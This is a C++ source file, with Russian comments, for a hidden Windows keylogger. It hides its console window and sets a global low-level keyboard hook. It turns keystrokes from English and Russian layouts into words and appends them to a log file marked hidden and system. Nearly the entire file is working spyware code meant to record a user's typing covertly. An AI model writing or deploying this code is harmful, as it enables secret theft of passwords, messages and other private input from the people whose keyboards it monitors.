#include <windows.h>
#include <iostream>
#include <fstream>
#include <list>
#include <map>
#include <sstream>
#include <vector>
#include <algorithm>

using namespace std;

enum class ExtraKey {
    VK_YO = 0xC0, // "Ё"
    VK_KH = 0xDB, // "Х"
    VK_HARD_SIGN = 0xDD, // "Ъ"
    VK_ZH = 0xBA, // "Ж"
    VK_HE = 0xDE, // "Э"
    VK_B = 0xBC, // "Б"
    VK_YU = 0xBE, // "Ю"
    VK_SHIFT_LEFT = 0xA0, // SHIFT LEFT
    VK_SHIFT_RIGHT = 0xA1 // SHIFT RIGHT
};

const int EN = 0;
const int RU = 1;
const int UNKNOWN = -1;

const TCHAR filename[] = L"log.txt"; // Имя файла, куда будут писаться слова
HANDLE fileHandler; // Указатель на файл
vector<char>  word_buffer; //Буффер для считывания слов
list<int> allowed_vk_сodes = { 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, // Стандартные цифры
                              45, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, // Цифры numlock
                              81, 87, 69, 82, 84, 89, 85, 73, 79, 80, 219, 221, // Буквы
                              65, 83, 68, 70, 71, 72, 74, 75, 76, 186, 222, 90,
                              88, 67, 86, 66, 78, 77, 188, 190, 192,
                              8, 13, 32, 160, 161 // Дополнительные
                             };

map<const int, const char*> common_vk_codes{
                                pair<const int, const char*>{81, "qй"},  pair<const int, const char*>{87, "wц"},  pair<const int, const char*>{69, "eу"},        pair<const int, const char*>{82, "rк"},
                                pair<const int, const char*>{84, "te"},  pair<const int, const char*>{89, "yн"},  pair<const int, const char*>{85, "uг"},        pair<const int,  const char*>{73, "iш"},
                                pair<const int, const char*>{79, "oщ"},  pair<const int, const char*>{80, "pз"},  pair<const int, const char*>{65, "aф"},        pair<const int, const char*>{83, "sы"},
                                pair<const int, const char*>{68, "dв"},  pair<const int, const char*>{70, "fа"},  pair<const int, const const char*>{71, "gп"},  pair<const int, const char*>{72, "hр"},
                                pair<const int, const char*>{74, "jо"},  pair<const int, const char*>{75, "kл"},  pair<const int, const char*>{76, "lд"},        pair<const int, const char*>{90, "zя"},
                                pair<const int, const char*>{88, "xч"},  pair<const int, const char*>{67, "cс"},  pair<const int, const char*>{86, "vм"},        pair<const int, const char*>{66, "bи"},
                                pair<const int, const char*>{78, "nт"},  pair<const int, const char*>{77, "mь"},  pair<const int, const char*>{48, "00"},        pair<const int, const char*>{49, "11"},
                                pair<const int, const char*>{50, "22"},  pair<const int, const char*>{51, "33"},  pair<const int, const char*>{52, "44"},        pair<const int, const char*>{53, "55"},
                                pair<const int, const char*>{54, "66"},  pair<const int, const char*>{55, "77"},  pair<const int, const char*>{56, "88"},        pair<const int, const char*>{57, "99"},
                                pair<const int, const char*>{45, "00"},  pair<const int, const char*>{96, "00"},  pair<const int, const char*>{97, "11"},        pair<const int, const char*>{98, "22"},
                                pair<const int, const char*>{99, "33"},  pair<const int, const char*>{100, "44"}, pair<const int, const char*>{101, "55"},       pair<const int, const char*>{102, "66"},
                                pair<const int, const char*>{103, "77"}, pair<const int, const char*>{104, "88"}, pair<const int, const char*>{105, "99"}
};

/* Проверка на существование кода */
bool CodeExistsInMap(map<const int, const char*>, int);

/* Обработчик нажатий клавиши */
LRESULT CALLBACK KeyboardHook(int, WPARAM, LPARAM);

/* Является разрешенным кодом */
bool IsAllowedCode(int);

/* Получить раскладку клавиатуры */
int GetKeyboardLayout();

/* Является отличающейся клавишей */
bool IsExtraKey(int);


int main(int argc, char** argv) {
    setlocale(LC_ALL, "Russian");

    ShowWindow(GetConsoleWindow(), SW_HIDE); // Скрываем окно

    fileHandler = CreateFile(filename, GENERIC_READ | GENERIC_WRITE, 0, NULL,
        OPEN_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_ARCHIVE, NULL);

    /* Ошибка создания файла */
    if (fileHandler == INVALID_HANDLE_VALUE) { ExitProcess(1); }
    CloseHandle(fileHandler); // Закрываем файл
 
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHook, 0, 0);
    MSG msg;
    BOOL bRet;
    while ((bRet = GetMessage(&msg, NULL, 0, 0)) != 0) {
        if (bRet == -1) { ExitProcess(1); }
        TranslateMessage(&msg);
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hook);

    ExitProcess(0);
}

LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam) {
    static int last;
    if (nCode == HC_ACTION) {
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
            int code = p->vkCode;
            char resultChar = '\0';

            if (IsAllowedCode(code)) {
                bool canAddInVector = true;

                //RU
                if (GetKeyboardLayout() == RU) {
                    if (last != int(ExtraKey::VK_SHIFT_LEFT) && last != int(ExtraKey::VK_SHIFT_RIGHT)) {
                        if (code == int(ExtraKey::VK_KH)) { resultChar = 'х'; }
                        if (code == int(ExtraKey::VK_HARD_SIGN)) { resultChar = 'ъ'; }
                        if (code == int(ExtraKey::VK_YO)) { resultChar = 'ё'; }
                        if (code == int(ExtraKey::VK_ZH)) { resultChar = 'ж'; }
                        if (code == int(ExtraKey::VK_HE)) { resultChar = 'э'; }
                        if (code == int(ExtraKey::VK_B)) { resultChar = 'б'; }
                        if (code == int(ExtraKey::VK_YU)) { resultChar = 'ю'; }
                    }

                    if (CodeExistsInMap(common_vk_codes, code)) {
                        resultChar = common_vk_codes[code][RU];
                    }

                } //RU

                //EN или неизвестная раскладка
                if (GetKeyboardLayout() == EN || GetKeyboardLayout() == UNKNOWN) {
                    if (CodeExistsInMap(common_vk_codes, code) && !IsExtraKey(code)) {
                        resultChar = common_vk_codes[code][EN];
                    }
                    else {
                        canAddInVector = false;
                    }
                }

                if (code == VK_BACK) {
                    if (!word_buffer.empty()) {
                        word_buffer.pop_back();
                    }
                    canAddInVector = false;
                }

                if ((code == VK_SPACE || code == VK_RETURN) && !word_buffer.empty()) {
                    std::stringstream stream;
                    for (char ch : word_buffer) {
                        stream << ch;
                    }
                    string stringedWord = stream.str();

                    ifstream fileRead;
                    fileRead.open(filename);

                    bool canWrite = true;

                    if (fileRead.is_open()) {
                        string line;
                        vector<string> vecStr;

                        while (std::getline(fileRead, line)) {
                            if (line == stringedWord) {
                                canWrite = false;
                                break;
                            }
                        }
                        fileRead.close();

                    }
                    else {
                        ExitProcess(1);
                    }

                    if (canWrite) {
                        ofstream fileWrite;
                        fileWrite.open(filename, ios_base::app);

                        if (fileWrite.is_open()) {

                            for (char element : word_buffer) {
                                fileWrite << element;
                            }

                            fileWrite << endl;
                            fileWrite.close();
                        }
                        else {
                            ExitProcess(1);
                        }

                        word_buffer.clear();
                    }

                    canAddInVector = false;
                    canWrite = true;
                }
                if (code != VK_SPACE && code != VK_RETURN &&
                    code != int(ExtraKey::VK_SHIFT_LEFT) && code != int(ExtraKey::VK_SHIFT_RIGHT) && canAddInVector) {
                    word_buffer.push_back(resultChar);
                }
            } //IsAllowedCode
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

bool IsAllowedCode(int code) {
    bool result = false;

    auto it = find(allowed_vk_сodes.begin(), allowed_vk_сodes.end(), code);
    if (it != allowed_vk_сodes.end()) { result = true; }

    return result;
}

int GetKeyboardLayout() {
    HWND handler = GetForegroundWindow();
    DWORD processId = GetWindowThreadProcessId(handler, NULL);
    HKL keyboardLayout = GetKeyboardLayout(processId);
    int laycoutCode = LOWORD(keyboardLayout);

    const int RU = 1049;
    const int EN = 1033;

    int result = -1;

    if (laycoutCode == EN) {
        result = 0;
    }else if (laycoutCode == RU) {
        result = 1;
    }

    return result;

}

bool CodeExistsInMap(map<const int, const char*> m, int key) {
    return m.find(key) == m.end() ? false : true;
}

bool IsExtraKey(int key) {
    bool isExtraKey = false;
    switch (key) {
            case int(ExtraKey::VK_YO) : // "Ё"
            case int(ExtraKey::VK_KH) : // "Х"
            case int(ExtraKey::VK_HARD_SIGN) : // "Ъ"
            case int(ExtraKey::VK_ZH) : // "Ж"
            case int(ExtraKey::VK_HE) : // "Э"
            case int(ExtraKey::VK_B) : // "Б"
            case int(ExtraKey::VK_YU) : // "Ю"
            case int(ExtraKey::VK_SHIFT_LEFT) : // SHIFT LEFT
            case int(ExtraKey::VK_SHIFT_RIGHT) : isExtraKey = true;
            break; // SHIFT RIGHT
                }
    return isExtraKey;
}
